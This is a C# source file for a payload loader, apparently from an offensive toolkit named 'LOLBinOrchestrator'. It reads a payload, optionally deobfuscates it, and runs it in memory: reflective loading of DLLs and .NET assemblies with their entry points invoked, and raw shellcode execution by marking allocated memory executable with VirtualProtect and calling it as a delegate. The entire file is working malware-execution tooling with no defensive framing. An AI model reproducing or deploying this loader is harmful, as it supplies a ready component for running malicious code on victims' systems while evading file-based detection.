using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace LOLBinOrchestrator
{
    /// <summary>
    /// Handles loading of payloads including reflective DLL loading and shellcode execution
    /// </summary>
    public class PayloadLoader
    {
        private readonly Obfuscator _obfuscator;

        public PayloadLoader(Obfuscator obfuscator)
        {
            _obfuscator = obfuscator ?? throw new ArgumentNullException(nameof(obfuscator));
        }

        /// <summary>
        /// Loads a payload based on the specified configuration
        /// </summary>
        /// <param name="config">Payload configuration</param>
        /// <returns>Load result</returns>
        public async Task<PayloadLoadResult> LoadPayloadAsync(PayloadConfig config)
        {
            var result = new PayloadLoadResult();

            try
            {
                if (!File.Exists(config.Path))
                {
                    result.Success = false;
                    result.Error = $"Payload file not found: {config.Path}";
                    return result;
                }

                var payloadBytes = await File.ReadAllBytesAsync(config.Path);

                // Apply obfuscation if enabled
                if (config.Obfuscation.Enabled)
                {
                    payloadBytes = await _obfuscator.DeobfuscateAsync(payloadBytes, config.Obfuscation);
                }

                switch (config.Type.ToLowerInvariant())
                {
                    case "dll":
                        result = await LoadDllAsync(payloadBytes, config);
                        break;
                    case "shellcode":
                        result = await LoadShellcodeAsync(payloadBytes, config);
                        break;
                    case "assembly":
                        result = await LoadAssemblyAsync(payloadBytes, config);
                        break;
                    default:
                        result.Success = false;
                        result.Error = $"Unsupported payload type: {config.Type}";
                        break;
                }

                return result;
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.Error = $"Error loading payload: {ex.Message}";
                return result;
            }
        }

        /// <summary>
        /// Loads a DLL payload using reflection
        /// </summary>
        /// <param name="dllBytes">DLL bytes</param>
        /// <param name="config">Payload configuration</param>
        /// <returns>Load result</returns>
        private async Task<PayloadLoadResult> LoadDllAsync(byte[] dllBytes, PayloadConfig config)
        {
            var result = new PayloadLoadResult();

            try
            {
                // Load the assembly into memory
                var assembly = Assembly.Load(dllBytes);
                result.Assembly = assembly;

                // Try to find and execute the main entry point
                var entryPoint = assembly.EntryPoint;
                if (entryPoint != null)
                {
                    var instance = Activator.CreateInstance(entryPoint.DeclaringType!);
                    var methodResult = entryPoint.Invoke(instance, null);
                    result.Output = methodResult?.ToString() ?? "Entry point executed successfully";
                }
                else
                {
                    result.Output = "Assembly loaded successfully (no entry point found)";
                }

                result.Success = true;
                return result;
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.Error = $"Error loading DLL: {ex.Message}";
                return result;
            }
        }

        /// <summary>
        /// Loads and executes shellcode
        /// </summary>
        /// <param name="shellcodeBytes">Shellcode bytes</param>
        /// <param name="config">Payload configuration</param>
        /// <returns>Load result</returns>
        private async Task<PayloadLoadResult> LoadShellcodeAsync(byte[] shellcodeBytes, PayloadConfig config)
        {
            var result = new PayloadLoadResult();

            try
            {
                // Allocate memory for shellcode
                var shellcodePtr = Marshal.AllocHGlobal(shellcodeBytes.Length);
                
                try
                {
                    // Copy shellcode to allocated memory
                    Marshal.Copy(shellcodeBytes, 0, shellcodePtr, shellcodeBytes.Length);

                    // Make memory executable
                    var oldProtect = 0u;
                    VirtualProtect(shellcodePtr, (UIntPtr)shellcodeBytes.Length, 0x40, out oldProtect);

                    // Create delegate for shellcode execution
                    var shellcodeDelegate = Marshal.GetDelegateForFunctionPointer<ShellcodeDelegate>(shellcodePtr);

                    // Execute shellcode
                    var shellcodeResult = shellcodeDelegate();
                    result.Output = $"Shellcode executed with result: {shellcodeResult}";
                    result.Success = true;
                }
                finally
                {
                    // Free allocated memory
                    Marshal.FreeHGlobal(shellcodePtr);
                }

                return result;
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.Error = $"Error executing shellcode: {ex.Message}";
                return result;
            }
        }

        /// <summary>
        /// Loads a .NET assembly
        /// </summary>
        /// <param name="assemblyBytes">Assembly bytes</param>
        /// <param name="config">Payload configuration</param>
        /// <returns>Load result</returns>
        private async Task<PayloadLoadResult> LoadAssemblyAsync(byte[] assemblyBytes, PayloadConfig config)
        {
            var result = new PayloadLoadResult();

            try
            {
                // Load the assembly
                var assembly = Assembly.Load(assemblyBytes);
                result.Assembly = assembly;

                // Try to find and execute the main method
                var mainMethod = assembly.EntryPoint;
                if (mainMethod != null)
                {
                    var instance = Activator.CreateInstance(mainMethod.DeclaringType!);
                    var methodResult = mainMethod.Invoke(instance, new object[] { new string[0] });
                    result.Output = methodResult?.ToString() ?? "Main method executed successfully";
                }
                else
                {
                    result.Output = "Assembly loaded successfully (no main method found)";
                }

                result.Success = true;
                return result;
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.Error = $"Error loading assembly: {ex.Message}";
                return result;
            }
        }

        /// <summary>
        /// Validates a payload file
        /// </summary>
        /// <param name="filePath">Path to the payload file</param>
        /// <param name="expectedType">Expected payload type</param>
        /// <returns>Validation result</returns>
        public async Task<PayloadValidationResult> ValidatePayloadAsync(string filePath, string expectedType)
        {
            var result = new PayloadValidationResult();

            try
            {
                if (!File.Exists(filePath))
                {
                    result.IsValid = false;
                    result.Error = "File does not exist";
                    return result;
                }

                var fileInfo = new FileInfo(filePath);
                result.FileSize = fileInfo.Length;

                // Basic file type validation
                switch (expectedType.ToLowerInvariant())
                {
                    case "dll":
                        result.IsValid = filePath.EndsWith(".dll", StringComparison.OrdinalIgnoreCase);
                        break;
                    case "shellcode":
                        result.IsValid = filePath.EndsWith(".bin", StringComparison.OrdinalIgnoreCase) || 
                                       filePath.EndsWith(".sc", StringComparison.OrdinalIgnoreCase);
                        break;
                    case "assembly":
                        result.IsValid = filePath.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) || 
                                       filePath.EndsWith(".dll", StringComparison.OrdinalIgnoreCase);
                        break;
                    default:
                        result.IsValid = true; // Accept any file type if not specified
                        break;
                }

                if (!result.IsValid)
                {
                    result.Error = $"File type does not match expected type: {expectedType}";
                }

                return result;
            }
            catch (Exception ex)
            {
                result.IsValid = false;
                result.Error = $"Error validating payload: {ex.Message}";
                return result;
            }
        }

        // P/Invoke declarations for shellcode execution
        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int ShellcodeDelegate();
    }

    /// <summary>
    /// Result of payload loading operation
    /// </summary>
    public class PayloadLoadResult
    {
        public bool Success { get; set; }
        public string Output { get; set; } = string.Empty;
        public string Error { get; set; } = string.Empty;
        public Assembly? Assembly { get; set; }
        public object? Result { get; set; }
    }

    /// <summary>
    /// Result of payload validation
    /// </summary>
    public class PayloadValidationResult
    {
        public bool IsValid { get; set; }
        public string Error { get; set; } = string.Empty;
        public long FileSize { get; set; }
        public string? FileType { get; set; }
    }
} 